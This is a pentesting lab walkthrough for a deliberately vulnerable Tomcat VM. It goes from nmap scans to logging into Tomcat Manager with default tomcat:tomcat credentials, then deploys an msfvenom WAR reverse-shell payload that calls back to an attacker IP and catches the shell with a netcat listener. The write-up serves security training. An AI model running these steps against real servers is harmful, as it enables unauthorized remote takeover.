# My_Tomcat_Host

## Machine Information

- **Machine:** My_Tomcat_Host
- **Platform:** Offensive Pentesting Lab

---

# Lab Setup

1. Download the vulnerable machine.
2. Import the OVA into VirtualBox.
3. Start the virtual machine.

If the virtual machine does not obtain an IP address, verify the network adapter configuration in VirtualBox.

![](images/7-1.png)

---

# Reconnaissance

## Discover the Target

```bash
nmap -sn 192.168.2.0/24
```

![](images/7-2.png)

---

## Port Scan

```bash
nmap -v -p- 192.168.2.135
```

![](images/7-3.png)

### Open Ports

| Port | Service |
|------|---------|
| 22 | SSH |
| 8080 | Apache Tomcat |

---

# Apache Tomcat Enumeration

## Access the Web Interface

Browse to:

```
http://192.168.2.135:8080/
```

The default Apache Tomcat page is displayed.

![](images/7-4.png)

---

## Tomcat Manager Login

Open the Tomcat Manager interface.

![](images/7-5.png)

Common default credentials:

```text
tomcat : tomcat
admin  : admin
```

The credentials below successfully authenticate.

```text
Username: tomcat
Password: tomcat
```

![](images/7-6.png)

---

# WAR File Deployment

## Generate a WAR Payload

Create a Java WAR payload using **msfvenom**.

```bash
msfvenom \
-p java/shell_reverse_tcp \
LHOST=192.168.2.219 \
LPORT=443 \
-f war \
-o shell.war
```

![](images/7-7.png)

---

## Upload the WAR File

Open the Tomcat Manager deployment page.

```
http://192.168.2.135:8080/manager/html
```

![](images/7-8.png)

Deploy the generated **shell.war** file.

![](images/7-9.png)

---

# Reverse Shell

## Start a Netcat Listener

```bash
nc -lvnp 443
```

---

## Trigger the Payload

Browse to:

```
http://192.168.2.135:8080/shell/
```

The Netcat listener receives an incoming connection.

---

## Reverse Shell Obtained

![](images/7-10.png)

---

# Attack Flow

1. Discover the target host.
2. Enumerate open ports.
3. Identify Apache Tomcat on port **8080**.
4. Access the Tomcat Manager interface.
5. Authenticate using valid credentials.
6. Generate a WAR payload.
7. Deploy the WAR file.
8. Start a Netcat listener.
9. Trigger the deployed application.
10. Obtain a reverse shell.